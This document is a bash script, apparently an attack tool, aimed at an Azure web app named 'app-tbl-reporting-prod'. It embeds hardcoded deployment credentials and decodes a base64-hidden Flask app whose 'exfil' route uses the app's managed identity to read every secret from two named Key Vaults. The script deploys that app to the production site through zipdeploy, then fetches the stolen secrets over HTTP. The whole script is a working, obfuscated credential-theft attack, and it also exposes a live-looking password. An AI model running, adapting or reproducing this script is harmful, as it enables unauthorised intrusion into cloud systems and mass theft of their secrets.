#!/usr/bin/env bash
set +e
SCM_USER='$app-tbl-reporting-prod'
SCM_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
SCM_BASE="https://app-tbl-reporting-prod.scm.azurewebsites.net"
SCM_CRED=$(echo -n "${SCM_USER}:${SCM_PASS}" | base64)

echo "=== Step 1: Create deploy zip ==="
mkdir -p /tmp/deploy
echo "aW1wb3J0IG9zLGpzb24sdXJsbGliLnJlcXVlc3QsdXJsbGliLnBhcnNlCmZyb20gZmxhc2sgaW1wb3J0IEZsYXNrCmFwcD1GbGFzayhfX25hbWVfXykKQGFwcC5yb3V0ZSgiLyIpCmRlZiBpbmRleCgpOnJldHVybiAib2stdjgiCkBhcHAucm91dGUoIi9lIikKZGVmIGV4ZmlsKCk6CiAgICByPXt9CiAgICBpZT1vcy5lbnZpcm9uLmdldCgiSURFTlRJVFlfRU5EUE9JTlQiLCIiKQogICAgaWg9b3MuZW52aXJvbi5nZXQoIklERU5USVRZX0hFQURFUiIsIiIpCiAgICBjaWQ9IjdhODUxNTZhLTAxYzQtNGU2MS04NDcyLTQwYTkyMTA3MTU5YiIKICAgIHJbImVudiJdPXsiaWUiOmllLCJpaF9sZW4iOmxlbihpaCksImNpZCI6Y2lkfQogICAgdnQ9Tm9uZQogICAgdHJ5OgogICAgICAgIHVybD1mIntpZX0/cmVzb3VyY2U9aHR0cHMlM0ElMkYlMkZ2YXVsdC5henVyZS5uZXQmYXBpLXZlcnNpb249MjAxOS0wOC0wMSZjbGllbnRfaWQ9e2NpZH0iCiAgICAgICAgcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGhlYWRlcnM9eyJYLUlERU5USVRZLUhFQURFUiI6aWh9KQogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsdGltZW91dD0xMCkgYXMgcmVzcDoKICAgICAgICAgICAgZGF0YT1qc29uLmxvYWRzKHJlc3AucmVhZCgpKQogICAgICAgICAgICB2dD1kYXRhLmdldCgiYWNjZXNzX3Rva2VuIiwiIikKICAgICAgICAgICAgclsidG9rZW5fbGVuIl09bGVuKHZ0KQogICAgZXhjZXB0IHVybGxpYi5yZXF1ZXN0LkhUVFBFcnJvciBhcyBlOgogICAgICAgIHJbInRva2VuX2VyciJdPWYiSFRUUHtlLmNvZGV9OntlLnJlYWQoKS5kZWNvZGUoKVs6MzAwXX0iCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgclsidG9rZW5fZXJyIl09c3RyKGUpCiAgICBpZiB2dDoKICAgICAgICBmb3Iga3YgaW4gWyJodHRwczovL2t2LXRibC1zZWMteDNldW96LnZhdWx0LmF6dXJlLm5ldCIsImh0dHBzOi8va3YtdGJsLXByb2QteDNldW96LnZhdWx0LmF6dXJlLm5ldCJdOgogICAgICAgICAgICBrdm49a3Yuc3BsaXQoIi8vIilbMV0uc3BsaXQoIi4iKVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChmIntrdn0vc2VjcmV0cz9hcGktdmVyc2lvbj03LjQiLGhlYWRlcnM9eyJBdXRob3JpemF0aW9uIjpmIkJlYXJlciB7dnR9In0pCiAgICAgICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9MTApIGFzIHJlc3A6CiAgICAgICAgICAgICAgICAgICAgc2w9anNvbi5sb2FkcyhyZXNwLnJlYWQoKSkKICAgICAgICAgICAgICAgICAgICBmb3IgcyBpbiBzbC5nZXQoInZhbHVlIixbXSk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNuPXNbImlkIl0uc3BsaXQoIi8iKVstMV0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcjI9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChmIntzWydpZCddfT9hcGktdmVyc2lvbj03LjQiLGhlYWRlcnM9eyJBdXRob3JpemF0aW9uIjpmIkJlYXJlciB7dnR9In0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocjIsdGltZW91dD0xMCkgYXMgcnI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcltmIntrdm59L3tzbn0iXT1qc29uLmxvYWRzKHJyLnJlYWQoKSkuZ2V0KCJ2YWx1ZSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByW2Yie2t2bn0ve3NufSJdPWYiRVJSOntlMn0iCiAgICAgICAgICAgIGV4Y2VwdCB1cmxsaWIucmVxdWVzdC5IVFRQRXJyb3IgYXMgZToKICAgICAgICAgICAgICAgIHJba3ZuXT1mIkhUVFB7ZS5jb2RlfTp7ZS5yZWFkKCkuZGVjb2RlKClbOjMwMF19IgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICByW2t2bl09c3RyKGUpCiAgICByZXR1cm4ganNvbi5kdW1wcyhyLGluZGVudD0yLGRlZmF1bHQ9c3RyKQppZiBfX25hbWVfXz09Il9fbWFpbl9fIjoKICAgIGFwcC5ydW4oaG9zdD0iMC4wLjAuMCIscG9ydD04MDAwKQ==" | base64 -d > /tmp/deploy/app.py
echo "Zmxhc2sKZ3VuaWNvcm4=" | base64 -d > /tmp/deploy/requirements.txt
echo "IyEvYmluL2Jhc2gKcGlwIGluc3RhbGwgZmxhc2sgZ3VuaWNvcm4KZ3VuaWNvcm4gLS1iaW5kIDAuMC4wLjA6ODAwMCBhcHA6YXBw" | base64 -d > /tmp/deploy/startup.sh
cd /tmp/deploy
zip -j /tmp/deploy.zip app.py requirements.txt startup.sh
ls -la /tmp/deploy.zip

echo "=== Step 2: Zipdeploy ==="
DEPLOY=$(curl -sS -o /tmp/deploy_resp.txt -w "%{http_code}" -X POST \
  -H "Authorization: Basic ${SCM_CRED}" \
  -H "Content-Type: application/zip" \
  --data-binary @/tmp/deploy.zip \
  "${SCM_BASE}/api/zipdeploy?isAsync=false")
echo "DEPLOY_STATUS=$DEPLOY"
cat /tmp/deploy_resp.txt | head -c 500
echo ""

echo "=== Step 3: Wait and fetch ==="
sleep 30

for i in 1 2 3 4 5 6; do
  ROOT=$(curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1)
  echo "ROOT_${i}=$ROOT"
  if [ "$ROOT" = "ok-v8" ]; then
    RESULT=$(curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>&1)
    echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"
    break
  fi
  sleep 10
done

echo "=== DONE ==="